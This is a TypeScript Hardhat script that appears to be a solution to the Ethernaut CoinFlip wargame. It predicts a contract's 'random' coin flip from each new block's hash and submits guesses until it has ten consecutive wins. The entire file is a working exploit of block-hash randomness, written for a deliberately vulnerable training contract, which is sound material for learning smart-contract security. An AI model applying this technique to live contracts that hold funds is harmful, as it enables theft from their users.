import { ethers } from "hardhat";
import nsEthers from "ethers";

const ETHERNAUT_ADDRESS = "";

async function main() {
  const CoinFlip = await ethers.getContractFactory("CoinFlip");
  const coinflip = await CoinFlip.attach(ETHERNAUT_ADDRESS);
  console.log("Attach CoinFlip contract to", coinflip.address);

  let lastBlock = await ethers.provider.getBlockNumber();
  while(true) {
    const newBlock = await getBlock();
    if (lastBlock < newBlock.number) {
      console.log("New block found!", newBlock.number);

      const flipResponse = getFlipResponse(newBlock);
      try {
        const flipTx = await coinflip.flip(flipResponse, { gasLimit: 4000000 });
        await flipTx.wait();
        console.log("Flip transaction finished", flipTx.hash);
      } catch (err) {
        console.error(err);
      }

      const consecutiveWins = await coinflip.consecutiveWins();
      console.log("Consecutive wins:", consecutiveWins.toString());

      if (consecutiveWins.toNumber() >= 10) {
        console.log("Congratulations! You won!");
        break;
      }

      lastBlock = await ethers.provider.getBlockNumber();
    }
  }
}

function getFlipResponse(block: nsEthers.providers.Block): boolean {
  const FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  const hash = parseInt(block.hash);
  const coinFlip = Math.floor(hash / FACTOR);
  return coinFlip == 1;
}

async function getBlock(sub: number = 0): Promise<nsEthers.providers.Block> {
  const lastBlockNumber = await ethers.provider.getBlockNumber();
  return ethers.provider.getBlock(lastBlockNumber - sub);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
